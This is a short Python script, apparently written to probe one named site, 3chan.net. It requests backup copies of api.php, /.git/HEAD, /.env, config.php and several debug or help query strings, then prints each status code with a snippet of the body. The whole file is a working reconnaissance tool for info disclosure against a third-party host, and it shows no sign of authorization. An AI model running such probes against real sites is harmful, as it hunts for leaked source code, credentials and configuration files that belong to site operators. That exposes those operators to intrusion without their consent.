#!/usr/bin/env python3
"""3chan - probe api.php source backups + info disclosure"""
import urllib.request

UA = {"User-Agent": "Mozilla/5.0"}

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read(20000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(2000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)[:60]

for p in ["/api.php~", "/api.php.bak", "/api.php.save", "/api.php.swp", "/api.php.txt",
          "/.git/HEAD", "/.env", "/config.php", "/api.php?debug=1", "/api.php?action=help",
          "/api.php?action=list_boards", "/api.php?action=get_index"]:
    code, body = fetch("http://3chan.net" + p)
    print("%s: %s size=%d %s" % (p, code, len(body), body[:80].replace("\n", " ")), flush=True)
